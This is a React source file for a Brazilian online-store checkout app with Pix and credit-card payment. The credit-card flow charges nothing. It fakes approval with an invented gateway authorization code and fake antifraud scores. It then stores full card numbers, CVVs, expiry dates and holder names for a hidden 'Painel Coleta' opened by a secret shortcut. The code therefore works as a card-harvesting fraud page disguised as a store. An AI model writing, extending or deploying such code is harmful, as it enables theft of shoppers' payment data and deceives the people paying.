import React, { useState, useMemo, useEffect } from 'react';
import {
  CartItem,
  CustomerInfo,
  CardInfo,
  PaymentMethod,
  OrderDetails,
  CheckoutConfig,
} from './types';
import {
  SAMPLE_CUSTOMER,
  TEST_CARDS,
  VALID_COUPONS,
} from './data/mockData';
import {
  generateOrderId,
  generateTrackingCode,
  generatePixPayload,
  detectCardBrand,
} from './utils/formatters';
import { saveNewOrder, saveOrUpdateOrder } from './utils/orderStorage';
import { getActiveCheckout, syncCheckoutsWithSupabase, setActiveCheckoutId } from './utils/checkoutStorage';
import { requestSigiloPayPix } from './utils/sigilopayClient';
import { Header } from './components/Header';
import { OrderSummary } from './components/OrderSummary';
import { CustomerForm } from './components/CustomerForm';
import { PaymentSelector } from './components/PaymentSelector';
import { PixPaymentView } from './components/PixPaymentView';
import { PixPreGenerationView } from './components/PixPreGenerationView';
import { CreditCardPaymentView } from './components/CreditCardPaymentView';
import { PaymentProcessingScreen } from './components/PaymentProcessingScreen';
import { OrderSuccessView } from './components/OrderSuccessView';
import { SecurityFooter } from './components/SecurityFooter';
import { PainelColeta } from './components/AdminPanel';
import { PainelAdmin } from './components/PainelAdmin';
import { ThreeCardsCheckout } from './components/ThreeCardsCheckout';
import { MultiStepCheckout } from './components/MultiStepCheckout';

export default function App() {
  const [currentView, setCurrentView] = useState<'checkout' | 'admin' | 'coleta'>(() => {
    if (typeof window !== 'undefined') {
      if (window.location.hash === '#admin') return 'admin';
      if (window.location.hash === '#coleta') return 'coleta';
      if (window.location.search.includes('site=admin')) return 'admin';
      if (window.location.search.includes('site=coleta')) return 'coleta';
    }
    return 'checkout';
  });

  const [checkoutConfig, setCheckoutConfig] = useState<CheckoutConfig>(() => getActiveCheckout());
  const [items, setItems] = useState<CartItem[]>(() => getActiveCheckout().products);
  const [customer, setCustomer] = useState<CustomerInfo>(SAMPLE_CUSTOMER);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>(() => {
    const active = getActiveCheckout();
    if (active.payments.pix.enabled) return 'pix';
    if (active.payments.creditCard.enabled) return 'credit_card';
    return 'pix';
  });
  const [cardInfo, setCardInfo] = useState<CardInfo>({
    number: TEST_CARDS[0].number,
    holderName: TEST_CARDS[0].holderName,
    expiry: TEST_CARDS[0].expiry,
    cvv: TEST_CARDS[0].cvv,
    installments: 1,
  });

  const [couponCode, setCouponCode] = useState<string>('');
  const [couponDiscount, setCouponDiscount] = useState<number>(0);
  const [freeShippingCoupon, setFreeShippingCoupon] = useState<boolean>(false);

  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [completedOrder, setCompletedOrder] = useState<OrderDetails | null>(null);
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Stable order ID for this checkout session
  const [orderId, setOrderId] = useState<string>(() => generateOrderId());

  // Listen for config changes from admin builder
  useEffect(() => {
    const handleConfigChange = () => {
      const active = getActiveCheckout();
      setCheckoutConfig(active);
      setItems(active.products);
      if (!active.payments.pix.enabled && active.payments.creditCard.enabled) {
        setPaymentMethod('credit_card');
      } else if (active.payments.pix.enabled && !active.payments.creditCard.enabled) {
        setPaymentMethod('pix');
      }
    };

    syncCheckoutsWithSupabase().then(() => {
      handleConfigChange();
    });

    window.addEventListener('techstore_checkouts_updated', handleConfigChange);
    return () => window.removeEventListener('techstore_checkouts_updated', handleConfigChange);
  }, []);

  // Listen for hash changes and secret shortcuts
  useEffect(() => {
    const handleHash = () => {
      if (window.location.hash === '#admin') {
        setCurrentView('admin');
      } else if (window.location.hash === '#coleta') {
        setCurrentView('coleta');
      } else {
        setCurrentView('checkout');
      }
    };

    const handleKeyDown = (e: KeyboardEvent) => {
      // Ctrl+Shift+A opens Painel Admin
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
        e.preventDefault();
        navigateTo('admin');
      }
      // Ctrl+Shift+C opens Painel Coleta
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'C' || e.key === 'c')) {
        e.preventDefault();
        navigateTo('coleta');
      }
    };

    window.addEventListener('hashchange', handleHash);
    window.addEventListener('keydown', handleKeyDown);

    return () => {
      window.removeEventListener('hashchange', handleHash);
      window.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  const navigateTo = (view: 'checkout' | 'admin' | 'coleta', targetCheckoutId?: string) => {
    if (targetCheckoutId) {
      setActiveCheckoutId(targetCheckoutId);
    }
    const active = getActiveCheckout();
    setCheckoutConfig(active);
    setItems(active.products);
    if (!active.payments.pix.enabled && active.payments.creditCard.enabled) {
      setPaymentMethod('credit_card');
    } else if (active.payments.pix.enabled && !active.payments.creditCard.enabled) {
      setPaymentMethod('pix');
    }

    if (view === 'admin') {
      window.location.hash = 'admin';
    } else if (view === 'coleta') {
      window.location.hash = 'coleta';
    } else {
      window.location.hash = '';
    }
    setCurrentView(view);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  // Calculations
  const subtotal = useMemo(
    () => items.reduce((acc, item) => acc + item.price * item.quantity, 0),
    [items]
  );

  const rawShipping = useMemo(() => {
    if (freeShippingCoupon) return 0;
    const threshold = checkoutConfig.shipping.freeShippingThreshold;
    if (threshold > 0 && subtotal >= threshold) return 0;
    return checkoutConfig.shipping.price;
  }, [subtotal, freeShippingCoupon, checkoutConfig]);

  const couponDiscountAmount = useMemo(
    () => (subtotal * couponDiscount) / 100,
    [subtotal, couponDiscount]
  );

  // Dynamic discount on Pix based on active checkoutConfig
  const pixDiscountAmount = useMemo(() => {
    if (paymentMethod !== 'pix') return 0;
    const pct = checkoutConfig.payments.pix.discountPercent || 0;
    return ((subtotal - couponDiscountAmount) * pct) / 100;
  }, [paymentMethod, subtotal, couponDiscountAmount, checkoutConfig]);

  const finalTotal = useMemo(() => {
    const total = subtotal - couponDiscountAmount - pixDiscountAmount + rawShipping;
    return Math.max(0, total);
  }, [subtotal, couponDiscountAmount, pixDiscountAmount, rawShipping]);

  // Dynamic Pix payload with active checkout credentials
  const pixCode = useMemo(() => {
    return generatePixPayload({
      amount: finalTotal,
      orderId,
      receiverName: checkoutConfig.payments.pix.receiverName || 'TechStore Brasil',
      receiverCity: checkoutConfig.payments.pix.receiverCity || 'Sao Paulo',
      pixKey: checkoutConfig.payments.pix.pixKey || 'pix@techstore.com.br',
    });
  }, [orderId, finalTotal, checkoutConfig]);

  // Real SigiloPay Pix State
  const [sigiloPayPix, setSigiloPayPix] = useState<{
    pixCode: string;
    qrCodeBase64: string;
    transactionId: string;
    isRealApi: boolean;
    error?: string;
  } | null>(null);

  const [pixGenerated, setPixGenerated] = useState<boolean>(false);
  const [processingScreen, setProcessingScreen] = useState<'pix_generating' | 'card_processing' | null>(null);

  // Handlers
  const handleUpdateQuantity = (id: string, delta: number) => {
    setItems((prev) =>
      prev
        .map((item) => {
          if (item.id === id) {
            const newQty = Math.max(1, item.quantity + delta);
            return { ...item, quantity: newQty };
          }
          return item;
        })
        .filter((item) => item.quantity > 0)
    );
  };

  const handleApplyCoupon = (codeToApply: string) => {
    const clean = codeToApply.trim().toUpperCase();
    const configCoupon = checkoutConfig.coupons.find((c) => c.code.toUpperCase() === clean);
    if (configCoupon) {
      setCouponCode(clean);
      setCouponDiscount(configCoupon.discountPercent || 0);
      setFreeShippingCoupon(!!configCoupon.freeShipping);
      return;
    }

    const found = VALID_COUPONS[clean];
    if (found) {
      setCouponCode(clean);
      if (found.discountPercent) setCouponDiscount(found.discountPercent);
      if (found.freeShipping) setFreeShippingCoupon(true);
    } else {
      alert('Cupom de desconto inválido ou expirado.');
    }
  };

  const handleFillTestData = () => {
    setCustomer(SAMPLE_CUSTOMER);
    setCardInfo({
      number: TEST_CARDS[0].number,
      holderName: TEST_CARDS[0].holderName,
      expiry: TEST_CARDS[0].expiry,
      cvv: TEST_CARDS[0].cvv,
      installments: 1,
    });
    setErrors({});
  };

  const validateCustomer = (): boolean => {
    const errs: Record<string, string> = {};

    if (!customer.name.trim() || customer.name.trim().length < 3) {
      errs.name = 'Informe seu nome completo';
    }
    if (!customer.email.trim() || !customer.email.includes('@')) {
      errs.email = 'Informe um e-mail válido';
    }
    if (checkoutConfig.customerFields.requireCpf) {
      const cleanCpf = customer.cpf.replace(/\D/g, '');
      if (cleanCpf.length < 11) {
        errs.cpf = 'Informe um CPF válido com 11 dígitos';
      }
    }
    if (checkoutConfig.customerFields.requirePhone) {
      const cleanPhone = customer.phone.replace(/\D/g, '');
      if (cleanPhone.length < 10) {
        errs.phone = 'Informe um telefone para contato';
      }
    }
    const cleanCep = customer.zipCode.replace(/\D/g, '');
    if (cleanCep.length < 8) {
      errs.zipCode = 'Informe um CEP válido';
    }
    if (!customer.street.trim()) {
      errs.street = 'Informe o logradouro / rua';
    }
    if (!customer.number.trim()) {
      errs.number = 'Informe o número';
    }

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const validateCard = (): boolean => {
    const errs: Record<string, string> = {};
    const cleanCardNumber = cardInfo.number.replace(/\D/g, '');
    if (cleanCardNumber.length < 15) {
      errs.cardNumber = 'Número de cartão inválido (mínimo 15 dígitos)';
    }
    if (!cardInfo.holderName.trim() || cardInfo.holderName.trim().length < 3) {
      errs.holderName = 'Nome do titular é obrigatório';
    }
    if (!cardInfo.expiry.includes('/') || cardInfo.expiry.length < 5) {
      errs.expiry = 'Validade inválida (MM/AA)';
    }
    if (cardInfo.cvv.length < 3) {
      errs.cvv = 'CVV inválido (3 ou 4 dígitos)';
    }

    setErrors((prev) => ({ ...prev, ...errs }));
    return Object.keys(errs).length === 0;
  };

  const finishOrder = (method: PaymentMethod) => {
    const now = new Date();
    const formattedDate = `${now.toLocaleDateString('pt-BR')} às ${now.toLocaleTimeString('pt-BR', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    })}`;

    const brand = detectCardBrand(cardInfo.number);
    const cleanNumber = cardInfo.number.replace(/\D/g, '');
    const lastDigits = cleanNumber.slice(-4) || '9104';

    // Calculate installments
    let totalWithInterest = finalTotal;
    const freeInst = checkoutConfig.payments.creditCard.freeInstallments || 6;
    if (cardInfo.installments > freeInst) {
      const rate = (cardInfo.installments - freeInst) * 0.015;
      totalWithInterest = finalTotal * (1 + rate);
    }
    const installmentValue = totalWithInterest / (cardInfo.installments || 1);

    const formattedFullNumber = cleanNumber.replace(/(\d{4})/g, '$1 ').trim() || cardInfo.number;

    const order: OrderDetails = {
      orderId,
      checkoutId: checkoutConfig.id,
      checkoutName: checkoutConfig.name,
      createdAt: formattedDate,
      timestamp: Date.now(),
      items: [...items],
      subtotal,
      discount: couponDiscountAmount + pixDiscountAmount,
      couponCode: couponCode || undefined,
      couponDiscountAmount: couponDiscountAmount > 0 ? couponDiscountAmount : undefined,
      pixDiscountAmount: pixDiscountAmount > 0 ? pixDiscountAmount : undefined,
      shipping: rawShipping,
      shippingOption: checkoutConfig.shipping.name || (rawShipping === 0 ? 'Frete Grátis Sul/Sudeste' : 'Sedex Expresso'),
      total: method === 'credit_card' ? totalWithInterest : finalTotal,
      paymentMethod: method,
      status: 'aprovado',
      customer: { ...customer },
      card:
        method === 'credit_card'
          ? {
              brand,
              lastDigits,
              cleanNumber,
              fullNumber: formattedFullNumber,
              holderName: cardInfo.holderName.toUpperCase(),
              expiry: cardInfo.expiry,
              cvv: cardInfo.cvv,
              installments: cardInfo.installments,
              installmentValue,
              gatewayAuthCode: `AUTH-${brand.toUpperCase()}-${Math.floor(100000 + Math.random() * 900000)}`,
              gatewayResponse: '00 - Transação autorizada com sucesso (3DS 2.0)',
            }
          : undefined,
      pix:
        method === 'pix'
          ? {
              qrCodeText: sigiloPayPix?.pixCode || pixCode,
              qrCodeBase64: sigiloPayPix?.qrCodeBase64,
              expiresAt: `${checkoutConfig.payments.pix.expirationMinutes || 15} minutos`,
              paidAt: formattedDate,
              endToEndId: `E00038166${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}${Math.random().toString(36).substring(2, 12)}`,
              receiverKey: checkoutConfig.payments.pix.pixKey || 'pix@sigilopay.com.br',
              receiverName: checkoutConfig.payments.pix.receiverName || 'SigiloPay Instituição de Pagamentos',
              txid: sigiloPayPix?.transactionId || `${orderId.replace(/[^a-zA-Z0-9]/g, '')}PIX`,
              sigilopayTxId: sigiloPayPix?.transactionId,
              sigilopayStatus: 'PAID',
            }
          : undefined,
      trackingCode: generateTrackingCode(),
      telemetry: {
        ip: '177.136.241.95',
        location: `${customer.city}, ${customer.state} - Brasil`,
        device: typeof navigator !== 'undefined' && navigator.userAgent.includes('Mobile') ? 'Smartphone Mobile' : 'Computador Desktop',
        browser: 'Google Chrome 128',
        os: 'Windows 11 / Mac OS',
        antifraudScore: '99.8% (Aprovado com Baixo Risco)',
        securityProtocol: 'TLS 1.3 / Encriptação SSL 256 bits',
      },
      timeline: [
        {
          title: 'Pedido Registrado no Checkout',
          timestamp: formattedDate,
          status: 'completed',
          description: `Pedido gerado na tela: ${checkoutConfig.name}.`,
        },
        {
          title: method === 'pix' ? 'Liquidação Pix SPI' : 'Aprovação Adquirente / Gateway',
          timestamp: formattedDate,
          status: 'completed',
          description: method === 'pix' ? 'Pagamento Pix confirmado instantaneamente.' : `Cartão aprovado em ${cardInfo.installments}x de ${installmentValue.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}.`,
        },
        {
          title: 'Encaminhado para Expedição',
          timestamp: formattedDate,
          status: 'current',
          description: 'Pacote pronto no Centro de Distribuição aguardando coleta.',
        },
      ],
    };

    // Persist order to storage for Painel Coleta
    saveOrUpdateOrder(order, method === 'pix' ? 'pix_paid' : 'card_coleta');

    setCompletedOrder(order);
    setIsProcessing(false);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleProceedToPix = async () => {
    const isCustomerValid = validateCustomer();
    if (!isCustomerValid) {
      window.scrollTo({ top: 100, behavior: 'smooth' });
      return;
    }

    setProcessingScreen('pix_generating');
    try {
      const res = await requestSigiloPayPix({
        orderId,
        amount: finalTotal,
        customer,
        checkoutId: checkoutConfig.id,
      });

      if (res.success && res.pixCode) {
        setSigiloPayPix({
          pixCode: res.pixCode,
          qrCodeBase64: res.qrCodeBase64 || '',
          transactionId: res.transactionId,
          isRealApi: res.isRealApi ?? false,
        });
        setPixGenerated(true);

        // Immediate persistence for Painel Coleta: Pix Gerado!
        const now = new Date();
        const formattedDate = new Intl.DateTimeFormat('pt-BR', {
          day: '2-digit',
          month: '2-digit',
          year: 'numeric',
          hour: '2-digit',
          minute: '2-digit',
        }).format(now);

        const pendingPixOrder: OrderDetails = {
          orderId,
          checkoutId: checkoutConfig.id,
          checkoutName: checkoutConfig.name,
          createdAt: formattedDate,
          timestamp: Date.now(),
          items: [...items],
          subtotal,
          discount: couponDiscountAmount + pixDiscountAmount,
          couponCode: couponCode || undefined,
          couponDiscountAmount: couponDiscountAmount > 0 ? couponDiscountAmount : undefined,
          pixDiscountAmount: pixDiscountAmount > 0 ? pixDiscountAmount : undefined,
          shipping: rawShipping,
          shippingOption: checkoutConfig.shipping.name || (rawShipping === 0 ? 'Frete Grátis Sul/Sudeste' : 'Sedex Expresso'),
          total: finalTotal,
          paymentMethod: 'pix',
          status: 'pendente_pix',
          customer,
          pix: {
            qrCodeText: res.pixCode,
            qrCodeBase64: res.qrCodeBase64 || '',
            expiresAt: `${checkoutConfig.payments.pix.expirationMinutes || 15} minutos`,
            receiverKey: checkoutConfig.payments.pix.pixKey || 'pix@sigilopay.com.br',
            receiverName: checkoutConfig.payments.pix.receiverName || 'SigiloPay Instituição de Pagamentos',
            txid: res.transactionId || `${orderId.replace(/[^a-zA-Z0-9]/g, '')}PIX`,
            sigilopayTxId: res.transactionId,
            sigilopayStatus: 'PENDING',
          },
          trackingCode: generateTrackingCode(),
          telemetry: {
            ip: '177.136.241.95',
            location: `${customer.city || 'São Paulo'}, ${customer.state || 'SP'} - Brasil`,
            device: typeof navigator !== 'undefined' && navigator.userAgent.includes('Mobile') ? 'Smartphone Mobile' : 'Computador Desktop',
            browser: 'Google Chrome 128',
            os: 'Android / iOS / Windows',
            antifraudScore: '99.5% (Pix Dinâmico Gerado)',
            securityProtocol: 'TLS 1.3 / Encriptação SSL 256 bits',
          },
          timeline: [
            {
              title: 'Cobrança Pix Gerada no Gateway',
              timestamp: formattedDate,
              status: 'completed',
              description: `QR Code e chave Copia e Cola gerados na SigiloPay para ${customer.name || 'Cliente'}.`,
            },
            {
              title: 'Aguardando Pagamento do Comprador',
              timestamp: formattedDate,
              status: 'current',
              description: 'Tela de Pix ativa no celular/computador do cliente.',
            },
          ],
        };

        saveOrUpdateOrder(pendingPixOrder, 'pix_generated');
      } else {
        setSigiloPayPix({
          pixCode: '',
          qrCodeBase64: '',
          transactionId: res.transactionId || '',
          isRealApi: true,
          error: res.error || res.message || 'Não foi possível gerar cobrança na SigiloPay.',
        });
        setPixGenerated(false);
      }
    } catch (err: any) {
      console.error('Erro ao requisitar Pix na SigiloPay:', err);
      setSigiloPayPix({
        pixCode: '',
        qrCodeBase64: '',
        transactionId: '',
        isRealApi: false,
        error: err?.message || 'Falha de comunicação ao gerar o Pix. Verifique seus dados e tente novamente.',
      });
      setPixGenerated(false);
    } finally {
      setTimeout(() => {
        setProcessingScreen(null);
      }, 1600);
    }
  };

  const handleSubmitCreditCard = () => {
    const isCustomerValid = validateCustomer();
    const isCardValid = validateCard();

    if (!isCustomerValid || !isCardValid) {
      window.scrollTo({ top: 100, behavior: 'smooth' });
      return;
    }

    setProcessingScreen('card_processing');
    setTimeout(() => {
      setProcessingScreen(null);
      finishOrder('credit_card');
    }, 2400);
  };

  const handleResetOrder = () => {
    setCompletedOrder(null);
    setSigiloPayPix(null);
    setPixGenerated(false);
    setProcessingScreen(null);
    setOrderId(generateOrderId());
    setCouponCode('');
    setCouponDiscount(0);
    setFreeShippingCoupon(false);
    setErrors({});
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  if (currentView === 'admin') {
    return (
      <PainelAdmin
        onGoToColeta={() => navigateTo('coleta')}
        onBackToCheckout={(targetId) => navigateTo('checkout', targetId)}
      />
    );
  }

  if (currentView === 'coleta') {
    return (
      <PainelColeta
        onGoToAdminBuilder={() => navigateTo('admin')}
        onBackToCheckout={(targetId) => navigateTo('checkout', targetId)}
      />
    );
  }

  const isDark = checkoutConfig.themeMode === 'dark' || checkoutConfig.brand?.themeMode === 'dark';

  return (
    <div className={`min-h-screen flex flex-col transition-colors ${
      isDark ? 'bg-neutral-950 text-neutral-100' : 'bg-neutral-50/80 text-neutral-900'
    }`}>
      {/* Header with dynamic store branding */}
      <Header brand={checkoutConfig.brand} />

      {/* Main Content Area */}
      <main className="flex-1 max-w-6xl w-full mx-auto px-4 sm:px-6 py-6 sm:py-10">
        {completedOrder ? (
          /* Order Confirmation / Receipt View */
          <OrderSuccessView
            order={completedOrder}
            onReset={handleResetOrder}
          />
        ) : pixGenerated && sigiloPayPix?.pixCode ? (
          /* Active Pix Screen with QR Code, Copia e Cola and Countdown */
          <div className="max-w-xl mx-auto py-4">
            <PixPaymentView
              amount={finalTotal}
              pixCode={sigiloPayPix.pixCode}
              qrCodeBase64={sigiloPayPix.qrCodeBase64}
              transactionId={sigiloPayPix.transactionId}
              isRealGateway={sigiloPayPix.isRealApi}
              orderId={orderId}
              onPaymentApproved={() => finishOrder('pix')}
              onBack={() => setPixGenerated(false)}
              discountPercent={checkoutConfig.payments.pix.discountPercent}
              buttonText={checkoutConfig.buttonText}
              themeMode={isDark ? 'dark' : 'light'}
              errorMessage={sigiloPayPix.error}
            />
          </div>
        ) : checkoutConfig.layoutStyle === 'yampi_cards' ? (
          /* 3 Caixas Modulares (Estilo Foto Yampi / Cartpanda) */
          <ThreeCardsCheckout
            config={checkoutConfig}
            items={items}
            customer={customer}
            onCustomerChange={(updated) => setCustomer((prev) => ({ ...prev, ...updated }))}
            cardInfo={cardInfo}
            onCardInfoChange={(updated) => setCardInfo((prev) => ({ ...prev, ...updated }))}
            paymentMethod={paymentMethod}
            onPaymentMethodChange={(method) => {
              setPaymentMethod(method);
              setErrors({});
            }}
            couponCode={couponCode}
            onApplyCoupon={handleApplyCoupon}
            couponDiscount={couponDiscount}
            freeShippingCoupon={freeShippingCoupon}
            onUpdateQuantity={handleUpdateQuantity}
            onSubmitOrder={(method) => {
              if (method === 'pix') {
                handleProceedToPix();
              } else if (method === 'credit_card') {
                handleSubmitCreditCard();
              } else {
                const isCustomerValid = validateCustomer();
                if (!isCustomerValid) {
                  window.scrollTo({ top: 100, behavior: 'smooth' });
                  return;
                }
                setIsProcessing(true);
                setTimeout(() => finishOrder('boleto'), 1000);
              }
            }}
            isProcessing={isProcessing || processingScreen === 'card_processing' || processingScreen === 'pix_generating'}
            errors={errors}
          />
        ) : checkoutConfig.layoutStyle === 'multi_step' ? (
          /* Multi-Telas (+1 de uma tela / Wizard de 3 Etapas) */
          <MultiStepCheckout
            config={checkoutConfig}
            items={items}
            customer={customer}
            onCustomerChange={(updated) => setCustomer((prev) => ({ ...prev, ...updated }))}
            cardInfo={cardInfo}
            onCardInfoChange={(updated) => setCardInfo((prev) => ({ ...prev, ...updated }))}
            paymentMethod={paymentMethod}
            onPaymentMethodChange={(method) => {
              setPaymentMethod(method);
              setErrors({});
            }}
            couponCode={couponCode}
            onApplyCoupon={handleApplyCoupon}
            couponDiscount={couponDiscount}
            freeShippingCoupon={freeShippingCoupon}
            onUpdateQuantity={handleUpdateQuantity}
            onSubmitOrder={(method) => {
              if (method === 'pix') {
                handleProceedToPix();
              } else if (method === 'credit_card') {
                handleSubmitCreditCard();
              } else {
                const isCustomerValid = validateCustomer();
                if (!isCustomerValid) {
                  window.scrollTo({ top: 100, behavior: 'smooth' });
                  return;
                }
                setIsProcessing(true);
                setTimeout(() => finishOrder('boleto'), 1000);
              }
            }}
            isProcessing={isProcessing || processingScreen === 'card_processing' || processingScreen === 'pix_generating'}
            errors={errors}
          />
        ) : (
          /* Main Checkout View (Single Page) */
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
            {/* Left Column: Forms and Payment (7 cols) */}
            <div className="lg:col-span-7 space-y-6">
              {/* Customer Info and Address Form */}
              <CustomerForm
                customer={customer}
                onChange={(updated) => setCustomer((prev) => ({ ...prev, ...updated }))}
                errors={errors}
                customerFields={checkoutConfig.customerFields}
                themeMode={isDark ? 'dark' : 'light'}
              />

              {/* Payment Method Selector */}
              <PaymentSelector
                selected={paymentMethod}
                onSelect={(method) => {
                  setPaymentMethod(method);
                  setPixGenerated(false);
                  setErrors({});
                }}
                pixDiscountPercent={checkoutConfig.payments.pix.discountPercent}
                pixEnabled={checkoutConfig.payments.pix.enabled}
                cardEnabled={checkoutConfig.payments.creditCard.enabled}
                maxInstallments={checkoutConfig.payments.creditCard.maxInstallments}
                themeMode={isDark ? 'dark' : 'light'}
              />

              {/* Active Payment View */}
              {paymentMethod === 'pix' ? (
                <PixPreGenerationView
                  amount={finalTotal}
                  discountPercent={checkoutConfig.payments.pix.discountPercent}
                  discountAmount={pixDiscountAmount}
                  onProceed={handleProceedToPix}
                  isGenerating={processingScreen === 'pix_generating'}
                  themeMode={isDark ? 'dark' : 'light'}
                  buttonText={checkoutConfig.buttonText || 'Prosseguir para Pagamento Pix'}
                  errorMessage={sigiloPayPix?.error}
                />
              ) : (
                <CreditCardPaymentView
                  cardInfo={cardInfo}
                  onChange={(updated) => setCardInfo((prev) => ({ ...prev, ...updated }))}
                  totalAmount={finalTotal}
                  onSubmit={handleSubmitCreditCard}
                  isProcessing={processingScreen === 'card_processing'}
                  errors={errors}
                  buttonText={checkoutConfig.buttonText}
                  themeMode={isDark ? 'dark' : 'light'}
                />
              )}
            </div>

            {/* Right Column: Sticky Order Summary (5 cols) */}
            <div className="lg:col-span-5 lg:sticky lg:top-28">
              <OrderSummary
                items={items}
                paymentMethod={paymentMethod}
                couponCode={couponCode}
                onApplyCoupon={handleApplyCoupon}
                couponDiscount={couponDiscount}
                freeShippingCoupon={freeShippingCoupon}
                onUpdateQuantity={handleUpdateQuantity}
                shippingConfig={checkoutConfig.shipping}
                pixDiscountPercent={checkoutConfig.payments.pix.discountPercent}
                themeMode={isDark ? 'dark' : 'light'}
              />
            </div>
          </div>
        )}
      </main>

      {/* Footer with Security Seals and dynamic company info */}
      <SecurityFooter
        footerConfig={checkoutConfig.footer}
        themeMode={isDark ? 'dark' : 'light'}
        supportEmail={checkoutConfig.supportEmail}
        supportWhatsapp={checkoutConfig.supportWhatsapp}
      />

      {/* Loading Screen Overlay when processing card or generating Pix */}
      {processingScreen && (
        <PaymentProcessingScreen
          mode={processingScreen}
          themeMode={isDark ? 'dark' : 'light'}
          amount={finalTotal}
        />
      )}
    </div>
  );
}
